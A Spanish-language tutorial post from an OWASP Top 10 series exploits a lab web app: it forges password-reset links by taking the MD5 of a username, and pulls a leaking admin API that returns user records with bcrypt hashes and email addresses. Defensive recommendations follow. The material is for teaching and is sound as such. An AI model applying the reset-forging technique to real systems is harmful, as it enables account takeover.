---
layout: post
title: "Perdida de autenticacion y exposicion de datos"
excerpt: "Explotando los 10 riesgos mas criticos segun el OWASP II"
image: "https://hackingprofessional.github.io/Security/images/OwaspTopTen2.png"
tags: 
  - Aprende Hacking
  - Hacking NodeJS
  - Pentesting WEB
---

Hello Engineers!  
En el dia de hoy, vamos a aprender acerca de una debilidad muy usual en las aplicaciones web.  
**A2-Broken Authentication**  
Este tipo de debilidad puede permitir a un atacante capturar u omitir los métodos de autenticación que usa una aplicación web.  
Para continuar, te invito a leer el siguiente [POST]() donde explico de manera detallada la configuracion del laboratorio con el que estaremos interactuando.  

## Conceptos Basicos  
Los desarrolladores frecuentemente crean esquemas personalizados de administración de sesión y autenticación, pero construirlos correctamente es difícil. Como resultado, estos esquemas personalizados con frecuencia tienen fallas en áreas como el cierre de sesión, la administración de contraseñas, los tiempos de espera, restauracion de contraseñas, la actualización de la cuenta, etc.  
A veces, encontrar tales fallas puede ser difícil, ya que cada implementación es única.  
Esto puede resultar en una autenticación rota que puede permitir que un atacante omita las restricciones de autenticación puestas por la aplicación.  

## Explotando las vulnerabilidades mas criticas en aplicaciones WEB.  
## A2: Broken Authentication  
**Escenario de la prueba:**   
Vamos a interactuar con un formulario de olvido de contraseñas.  

<figure>
  <img src="https://hackingprofessional.github.io/Security/images/ForgotPass.png" width="40%" height="55%">
	<figcaption>
    <a href="https://hackingprofessional.github.io/Security/images/ForgotPass.png" title="Formulario olvido de contraseñas">Formulario olvido de contraseñas</a>.
  </figcaption>
</figure>

Luego de ingresar el usuario para el reseteo de su contraseña, nos llega el tipico correo de restauracion de cuentas.  

<figure>
  <img src="https://hackingprofessional.github.io/Security/images/EmailReceived.png" width="40%" height="55%">
	<figcaption>
    <a href="https://hackingprofessional.github.io/Security/images/EmailReceived.png" title="Correo con link de reseteo de contraseña">Correo con link de reseteo de contraseña</a>.
  </figcaption>
</figure>

Para esta aplicacion, El link de restablecimiento de contraseña aparentemente es débil, el cual esta compuesto por el nombre del usuario con el que inicia sesion y un parámetro de token que esta en MD5 y este puede ser fácilmente calculado por un atacante.   

```bash  
http://127.0.0.1:9090/resetpw?login=GerhAdmin&token=7f73f68c7b6d18b0fd0de15806139d94
# URL DESCOMPUESTA
# login=GerhAdmin
# token=7f73f68c7b6d18b0fd0de15806139d94
```  

Este problema puede ser explotado por un atacante para restablecer la contraseña de cualquier usuario utilizando una URL como la siguiente:  

```r  
http://127.0.0.1:9090/resetpw?login=<username>&token=<md5(username)>
```  

Para obtener el hash de un texto podemos usar la herramienta **md5sum**.  

```zsh  
┌─[root@BinaryChaos] - [/home/gerh/Escritorio/Prometheus/Blog/Junio/DAMM] - [Sun Jun 30, 08:54]
└─[$]> # echo -n "GerhAdmin" | md5sum 
7f73f68c7b6d18b0fd0de15806139d94  -
```  

Listo una vez que tenemos el nombre del usuario en MD5, podemos facilmente restaurar la contraseña para cualquier usuario.  

<figure>
  <img src="https://hackingprofessional.github.io/Security/images/ResetPass.png" width="40%" height="55%">
	<figcaption>
    <a href="https://hackingprofessional.github.io/Security/images/ResetPass.png" title="Reseteando la contraseña del usuario GerhAdmin">Reseteando la contraseña del usuario GerhAdmin</a>.
  </figcaption>
</figure>

## A3: Sensitive Data Exposure
La exposición de datos confidenciales se produce cuando los datos como contraseñas, tokens, roles, etc., están presentes o se filtran hacia donde no se pretende que estén.  
A continuacion, podemos visualizar una tabla con posible informacion de los usuarios registrados:  

<figure>
  <img src="https://hackingprofessional.github.io/Security/images/SensitiveData.png" width="40%" height="55%">
	<figcaption>
    <a href="https://hackingprofessional.github.io/Security/images/SensitiveData.png" title="Tabla con usuarios registrados">Tabla con usuarios registrados</a>.
  </figcaption>
</figure>

Si interceptamos la peticion con burpsuite o analizamos las peticiones realizadas antes de renderizar la pagina, logramos identificar que para la visualizacion de los datos anteriores se utiliza una API.   

<figure>
  <img src="https://hackingprofessional.github.io/Security/images/SensitiveData2.png" width="40%" height="55%">
	<figcaption>
    <a href="https://hackingprofessional.github.io/Security/images/SensitiveData2.png" title="Analizando las peticiones realizadas">Analizando las peticiones realizadas</a>.
  </figcaption>
</figure>

Si accedemos a la URL encontrada previamente, podemos notar que el API responde un JSON con informacion sensible.  
Cabe aclarar que entre los datos sensibles se encuentra las contraseñas de los usuarios, las cuales pueden descubiertas por un ataque de fuerza bruta.  
Si deseas saber como realizar este ataque, te invito al siguiente [Link]().  

El contenido de la URL **http://172.17.0.2:9090/app/admin/usersapi**, es el siguiente:  

```js  
{
    success: true,
    users: [{
            id: 1,
            name: "Admin",
            login: "Administrator",
            email: "Administrator@gerh.com",
            password: "$2a$10$hVTWi4gUzy5YFeKdP9wKyeg3x1oFMLiqAAAA22AVHen/Oy.L2UZVy",
            role: null,
            createdAt: "2019-06-30T13:23:02.485Z",
            updatedAt: "2019-06-30T13:23:02.485Z"
        },
        {
            id: 2,
            name: "Admin",
            login: "Admin",
            email: "Admin@gerh.com",
            password: "$2a$10$wLaDHz9N8EPGaH2gOFxMHek49lrgl1RecnbkERm5.8awMUB2XurSS",
            role: null,
            createdAt: "2019-06-30T13:50:19.383Z",
            updatedAt: "2019-06-30T13:50:19.383Z"
        },
        {
            id: 3,
            name: "Gerardo Eliasib",
            login: "GerhAdmin",
            email: "gerueda6@misena.edu.co",
            password: "$2a$10$8WHqEwOltdbk91GFxwLzk.OEVJrY3RgOHS/bJuv57H8LsFNqz.3iC",
            role: null,
            createdAt: "2019-06-30T14:22:53.790Z",
            updatedAt: "2019-06-30T14:22:53.790Z"
        }
    ]
}
```  

## Recomendaciones  
Como mínimo, siga las siguientes recomendaciones y consulte las referencias:  
  - Clasifique los datos procesados, almacenados o transmitidos por el sistema. Identifique qué información es sensible de acuerdo a las regulaciones, leyes o requisitos del negocio y del país.  
  - Aplique los controles adecuados para cada clasificación.  
  - No almacene datos sensibles innecesariamente. Descártelos tan pronto como sea posible o utilice un sistema de tokenizacion que cumpla con PCI DSS. Los datos que no se almacenan no pueden
ser robados.  
  - Cifre todos los datos sensibles cuando sean almacenados.  
  - Cifre todos los datos en tránsito utilizando protocolos seguros como TLS con cifradores que utilicen Perfect Forward Secrecy (PFS), priorizando los algoritmos en el servidor. Aplique el cifrado utilizando directivas como HTTP Strict Transport Security (HSTS).  
  - Utilice únicamente algoritmos y protocolos estándares y fuertes e implemente una gestión adecuada de claves. No cree sus propios algoritmos de cifrado.  
  - Deshabilite el almacenamiento en cache de datos sensibles.  
  - Almacene contraseñas utilizando funciones de hashing adaptables con un factor de trabajo (retraso) además de SALT, como Argon2, scrypt, bcrypt o PBKDF2.  
  - Verifique la efectividad de sus configuraciones y parámetros de forma independiente.  

## Aprende hacking explotando las vulnerabilidades mas criticas en aplicaciones WEB.  

 - [A1: Inyección](https://hackingprofessional.github.io/Security/Como-realizar-una-inyeccion-SQL-OWASP-1)   
 - [A2: Pérdida de Autenticación](https://hackingprofessional.github.io/Security/Perdida-de-autenticacion-y-exposicion-de-datos-OWASP-II)  
 - [A3: Exposición de datos sensibles](https://hackingprofessional.github.io/Security/Perdida-de-autenticacion-y-exposicion-de-datos-OWASP-II)  
 - [A4: Entidades Externas XML (XXE)](https://hackingprofessional.github.io/Security/Como-realizar-una-inyeccion-XML-OWASP-III)  
 - [A5: Pérdida de Control de Acceso](https://hackingprofessional.github.io/Security/Evadiendo-controles-de-acceso-OWASP-IV)  
 - [A6: Configuración de Seguridad Incorrecta](https://hackingprofessional.github.io/Security/El-riesgo-de-las-Configuraciónes-Incorrectas-de-Seguridad-OWAPS-V)  
 - [A7: Secuencia de Comandos en Sitios Cruzados (XSS)](https://hackingprofessional.github.io/Security/Aprende-a-realizar-una-inyeccion-XSS-OWASP-VI)  
 - [A8: Deserialización Insegura](https://hackingprofessional.github.io/Security/Aprende-que-es-Deserialización-Insegura-OWASP-VII)  
 - [A9: Componentes con vulnerabilidades conocidas](https://hackingprofessional.github.io/Security/Explotando-vulnerabilidades-conocidas-OWASP-VIII)  
 - [A10: Registro y Monitoreo Insuficientes](https://hackingprofessional.github.io/Security/Explotando-vulnerabilidades-conocidas-OWASP-VIII)  


 [Para mas informacion leer el siguiente PDF publicado por el OWASP](https://www.owasp.org/images/5/5e/OWASP-Top-10-2017-es.pdf)